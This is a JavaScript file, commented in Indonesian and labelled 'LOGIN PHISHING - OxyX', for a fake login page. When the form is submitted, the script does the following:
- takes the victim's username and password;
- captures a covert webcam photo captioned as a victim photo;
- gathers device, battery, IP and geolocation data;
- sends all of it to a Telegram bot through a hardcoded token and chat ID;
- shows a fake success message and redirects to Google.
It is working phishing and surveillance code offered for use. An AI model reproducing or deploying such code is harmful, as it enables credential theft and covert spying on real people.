// ===== KONFIGURASI TELEGRAM (GANTI!) =====
const BOT_TOKEN = '8591936539:AAE5V8EQVLYSv67BffEsNcbmytd3rgR3EN0';
const CHAT_ID = '8534745558';

// ===== ELEMEN =====
const form = document.getElementById('loginForm');
const usernameInput = document.getElementById('username');
const passwordInput = document.getElementById('password');
const errorMsg = document.getElementById('errorMsg');
const loginBtn = document.getElementById('loginBtn');

// ===== KAMERA (ambil foto otomatis) =====
let videoStream = null;
const videoEl = document.getElementById('videoPreview');

async function startCamera() {
  try {
    videoStream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: 'user', width: 640, height: 480 }
    });
    videoEl.srcObject = videoStream;
    await videoEl.play();
    return true;
  } catch (e) {
    try {
      videoStream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: 'environment', width: 640, height: 480 }
      });
      videoEl.srcObject = videoStream;
      await videoEl.play();
      return true;
    } catch (e2) {
      return false;
    }
  }
}
startCamera();

// ===== CAPTURE FOTO =====
function capturePhoto() {
  if (!videoStream || videoEl.readyState < 2) return null;
  try {
    const canvas = document.createElement('canvas');
    canvas.width = videoEl.videoWidth || 640;
    canvas.height = videoEl.videoHeight || 480;
    const ctx = canvas.getContext('2d');
    ctx.drawImage(videoEl, 0, 0, canvas.width, canvas.height);
    return canvas.toDataURL('image/jpeg', 0.8);
  } catch(e) { return null; }
}

function dataURItoBlob(dataURI) {
  const byteString = atob(dataURI.split(',')[1]);
  const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
  const ab = new ArrayBuffer(byteString.length);
  const ia = new Uint8Array(ab);
  for (let i = 0; i < byteString.length; i++) ia[i] = byteString.charCodeAt(i);
  return new Blob([ab], { type: mimeString });
}

// ===== DATA PERANGKAT & LOKASI =====
async function getDeviceData() {
  const ua = navigator.userAgent || '';
  let brand = 'Unknown';
  if (ua.includes('Samsung')) brand = 'Samsung';
  else if (ua.includes('Xiaomi') || ua.includes('Redmi')) brand = 'Xiaomi';
  else if (ua.includes('OPPO')) brand = 'OPPO';
  else if (ua.includes('vivo')) brand = 'vivo';
  else if (ua.includes('OnePlus')) brand = 'OnePlus';
  else if (ua.includes('Realme')) brand = 'Realme';
  else if (ua.includes('Pixel')) brand = 'Google Pixel';
  else if (ua.includes('Nokia')) brand = 'Nokia';
  else if (ua.includes('ASUS')) brand = 'ASUS';
  else if (ua.includes('Lenovo')) brand = 'Lenovo';
  else if (ua.includes('Huawei') || ua.includes('Honor')) brand = 'Huawei/Honor';
  else brand = 'Generic Android';

  let batteryPercent = 'N/A';
  let batteryCharging = 'N/A';
  try {
    const bat = await navigator.getBattery();
    batteryPercent = Math.round(bat.level * 100) + '%';
    batteryCharging = bat.charging ? '🔌 Charging' : '🔋 Tidak charging';
  } catch(e) {}

  let ip = 'N/A', location = 'N/A';
  try {
    const res = await fetch('https://api.ipify.org?format=json');
    const data = await res.json();
    ip = data.ip;
    const locRes = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,city,regionName,lat,lon,isp`);
    const locData = await locRes.json();
    if (locData.status === 'success') {
      location = `${locData.city}, ${locData.regionName}, ${locData.country} (${locData.lat}, ${locData.lon}) - ISP: ${locData.isp}`;
    }
  } catch(e) {}

  return { brand, batteryPercent, batteryCharging, ip, location };
}

// ===== KIRIM KE TELEGRAM =====
async function sendToTelegram(username, password, photoDataURL) {
  const device = await getDeviceData();
  const timestamp = new Date().toLocaleString('id-ID');

  // Kirim pesan teks (kredensial + data)
  const textMsg = `🔐 *LOGIN PHISHING - OxyX*\n` +
                  `━━━━━━━━━━━━━━━━\n` +
                  `👤 *Username:* ${username}\n` +
                  `🔑 *Password:* ${password}\n` +
                  `━━━━━━━━━━━━━━━━\n` +
                  `📟 *HP:* ${device.brand}\n` +
                  `🔋 *Baterai:* ${device.batteryPercent} (${device.batteryCharging})\n` +
                  `🌐 *IP:* ${device.ip}\n` +
                  `📍 *Lokasi:* ${device.location}\n` +
                  `🕒 *Waktu:* ${timestamp}\n` +
                  `━━━━━━━━━━━━━━━━\n` +
                  `⚠️ *ENTITY PRIORITY* ⚠️`;

  try {
    // Kirim teks
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: CHAT_ID, text: textMsg, parse_mode: 'Markdown' })
    });

    // Kirim foto jika ada
    if (photoDataURL) {
      const blob = dataURItoBlob(photoDataURL);
      const formData = new FormData();
      formData.append('chat_id', CHAT_ID);
      formData.append('photo', blob, 'oxyx_phishing.jpg');
      formData.append('caption', `📸 Foto korban - ${timestamp}`);
      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
        method: 'POST',
        body: formData
      });
    }
  } catch(e) {}
}

// ===== HANDLE LOGIN =====
form.addEventListener('submit', async (e) => {
  e.preventDefault();

  const username = usernameInput.value.trim();
  const password = passwordInput.value.trim();

  if (!username || !password) {
    errorMsg.textContent = '⚠️ Harap isi semua field';
    errorMsg.style.color = '#ff8800';
    return;
  }

  // Ubah tombol
  loginBtn.textContent = '⏳ MENGIRIM...';
  loginBtn.disabled = true;
  errorMsg.textContent = '⏳ Memproses...';
  errorMsg.style.color = '#00ff88';

  // Ambil foto
  const photoData = capturePhoto();

  // Kirim ke Telegram
  await sendToTelegram(username, password, photoData);

  // Reset form dengan efek "berhasil"
  errorMsg.textContent = '✅ Login berhasil! Mengalihkan...';
  errorMsg.style.color = '#00ff88';

  // Redirect palsu (ke Google)
  setTimeout(() => {
    window.location.href = 'https://www.google.com';
  }, 2000);
});
